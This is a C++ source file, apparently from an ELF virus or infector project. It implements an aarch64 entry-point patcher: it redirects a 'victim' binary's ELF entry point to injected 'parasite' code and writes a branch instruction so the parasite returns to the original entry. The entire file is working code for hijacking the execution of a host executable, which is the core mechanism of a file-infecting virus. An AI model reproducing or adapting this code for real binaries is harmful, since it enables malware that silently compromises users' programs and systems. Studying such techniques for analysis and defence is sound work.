#include "redirection/entry_point.hh"

namespace vt::redirection {

bool EntryPointPatcher::operator()(Elf64_Addr parasite_entry_address,
                                   Elf64_Off parasite_file_offset,
                                   Elf64_Off patch_offset_from_parasite_start,
                                   std::span<std::byte> victim) {
  // constexpr uint32_t no_op_to_be_patched = 0x11223344;
  //  For aarch64, patch the b address to the original entry point.
  //  It is assumed that the inserted virus has at least 4 bytes of noop and
  //  that's where it jumps back to host.

  // b imm26
  // 000101 imm26
  // imm26 = rel / 4
  // The rel is offset from the current instruction (b xxx)
  // The patched jump instruction is always 4 bytes.

  auto& ehdr = reinterpret_cast<Elf64_Ehdr&>(*victim.data());

  // Calculate the difference between original (destination) and current branch
  // instruction.
  int32_t rel = ehdr.e_entry -
                (parasite_entry_address + patch_offset_from_parasite_start);

  rel /= 4;
  auto* inst = reinterpret_cast<int32_t*>(
      &victim[parasite_file_offset + patch_offset_from_parasite_start]);

  *inst = rel;

  *inst &= 0b11111111111111111111111111;
  // fill in op-code
  constexpr auto op_code = 0b00010100000000000000000000000000;

  *inst |= (op_code);

  ehdr.e_entry = parasite_entry_address;
  return true;
}

}  // namespace vt::redirection